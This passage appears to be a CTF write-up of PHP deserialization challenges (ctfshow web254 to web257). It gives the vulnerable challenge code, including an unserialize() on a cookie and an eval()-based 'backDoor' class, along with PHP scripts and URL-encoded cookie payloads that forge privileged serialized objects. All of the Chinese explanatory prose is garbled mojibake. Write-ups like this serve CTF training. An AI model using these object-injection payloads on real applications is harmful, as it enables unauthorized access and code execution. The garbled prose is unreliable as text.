align="left">ÂΩì‰∏Ä‰∏™ÂØπË±°Ë¢´ÂÖãÈöÜÊó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÂÆûÁé∞ÂØπË±°ÁöÑÂÖãÈöÜ„ÄÇ</td></tr><tr><td align="left">__debugInfo</td><td align="left">ÂΩì‰ΩøÁî® var_dump() Êàñ print_r() ËæìÂá∫‰∏Ä‰∏™ÂØπË±°Êó∂Ëá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÊéßÂà∂ÂØπË±°ÁöÑË∞ÉËØï‰ø°ÊÅØËæìÂá∫„ÄÇ</td></tr><tr><td align="left">__sleep</td><td align="left">Âú®ÂØπË±°Ë¢´Â∫èÂàóÂåñ‰πãÂâçËá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÊéßÂà∂Âì™‰∫õÂ±ûÊÄßË¢´Â∫èÂàóÂåñ„ÄÇ</td></tr><tr><td align="left">__wakeup</td><td align="left">Âú®ÂØπË±°Ë¢´ÂèçÂ∫èÂàóÂåñ‰πãÂêéËá™Âä®Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®Êù•ÈáçÊñ∞ÂàùÂßãÂåñÂØπË±°ÁöÑÂ±ûÊÄß„ÄÇ</td></tr></tbody></table><p>PHP ÂÆòÊñπÊñáÊ°£Â∑≤ÁªèÂæàËØ¶ÁªÜ‰∫ÜÔºåËøôÈáå‰∏çÂú®ËµòËø∞Ôºå‰∏ç‰∏ÄÂÆöÈúÄË¶ÅÂ≠¶‰ºöÊâÄÊúâÁöÑÂáΩÊï∞ÔºåÈô§ÂºÄÂ∏∏ËßÅÁöÑÔºåÂÖ∂‰ªñÁöÑÂú®ÈÅáÂà∞ÁöÑÊó∂ÂÄôÊü•ÈòÖÂç≥ÂèØ„ÄÇ</p><h3 id="web254-278"><a href="#web254-278" class="headerlink" title="web254-278"></a>web254-278</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Âè™Ë¶ÅËß¶Âèë**vipOneKeyGetFlag()**ÂáΩÊï∞Â∞±ÂèØ‰ª•ÂæóÂà∞flag</p><p>ËÄÉÂØüÂü∫Á°ÄÁöÑ‰ª£Á†ÅÂÆ°ËÆ°ÔºåÊª°Ë∂≥<code>$this-&gt;username===$u&amp;&amp;$this-&gt;password===$p</code>Âç≥ÂèØ</p><h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>‰∏é‰∏äÈ¢ò‰∏çÂêåÁöÑÊòØËøôÊ¨°ÁöÑ<code>$user</code>ÊòØÁî±cookieÁöÑuserÂèòÈáèÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÔºåËÄÉÂØü‰∫ÜÂü∫Êú¨ÁöÑÂèçÂ∫èÂàóÂåñ</p><p>Ë¶ÅÊ±Ç cookie ‰∏≠ user ÂÄº‰∏∫‰∏Ä‰∏™Â∫èÂàóÂåñÁöÑ ctfshowUser ÂØπË±°ÔºåÂ±ûÊÄß isVip ÂÄº‰∏∫ trueÔºåusername Âíå password Âíå GET ÂèÇÊï∞Ëé∑ÂèñÁöÑ‰∏ÄËá¥„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;&#125;</span>Âõ†‰∏∫cookie‰∏≠Â∞Ü"‰Ωú‰∏∫Êà™Êñ≠Á¨¶Âè∑ÔºåÊâÄÈúÄË¶ÅÁºñÁ†ÅÁªïËøáÔºåËøôÈáåÈááÁî®urlÁºñÁ†Å</code></pre><h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>**vipOneKeyGetFlag()**ÊñπÊ≥ïË¶ÅÊ±ÇusernameÂíåpassword‰∏ç‰∏ÄÊ†∑Ôºå‰º†ÂÖ•ÁöÑÁ±ªÊòØËá™Â∑±ÂèØÊéßÁöÑÔºåÊîπÂ∞±Ë°å‰∫ÜÂëó</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:5:"xxxxx";s:5:"isVip";b:1;&#125;</span></code></pre><h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string 